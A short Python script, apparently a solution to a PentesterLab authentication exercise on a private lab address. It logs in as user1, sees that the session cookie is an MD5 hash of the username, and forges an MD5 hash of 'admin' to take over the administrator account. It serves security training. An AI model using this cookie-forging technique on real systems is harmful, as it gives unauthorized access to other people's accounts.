import requests
import hashlib
# https://stackoverflow.com/questions/31554771/how-to-use-cookies-in-python-requests
# https://stackoverflow.com/questions/5297448/how-to-get-md5-sum-of-a-string-using-python
# <form action="" action="get">
#   Username: <input type="text" name="username"/>
#   Password: <input type="password" name="password"/>
#   <input type="submit" name="submit"/>
# </form>

# r = requests.post('http://10.0.1.11/authentication/example3/', data = {'username':'user1', 'password': 'pentesterlab'})
data = {'username':'user1', 'password': 'pentesterlab'}
r = requests.get('http://10.0.1.11/authentication/example4/', params=data)
print(r.url)
# print(r.content)
cookies = r.cookies.get_dict()
print(f"{cookies['user']}")

test = hashlib.md5("user1".encode("utf-8"))
print(test.hexdigest())

admin = hashlib.md5("admin".encode("utf-8")).hexdigest()
cookies['user'] = admin
print(f"{cookies['user']}")

r = requests.get('http://10.0.1.11/authentication/example4/', cookies=cookies)
print(r.url)
print(r.content)

